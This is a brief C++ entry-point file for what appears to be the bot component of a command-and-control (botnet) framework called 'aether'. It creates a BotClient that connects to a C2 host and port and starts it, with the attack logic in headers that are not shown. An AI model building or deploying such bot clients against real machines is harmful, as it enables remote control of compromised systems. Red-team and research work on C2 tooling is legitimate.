#include "bot_client.hpp"
#include "protocol.hpp"
#include <iostream>

int main() {
    try {
        BotClient bot(aether::C2_HOST, aether::C2_BOT_PORT);
        bot.start();
    } catch (const std::exception& e) {
        std::cerr << "[BOT] Fatal Error: " << e.what() << std::endl;
        return 1;
    }
    return 0;
}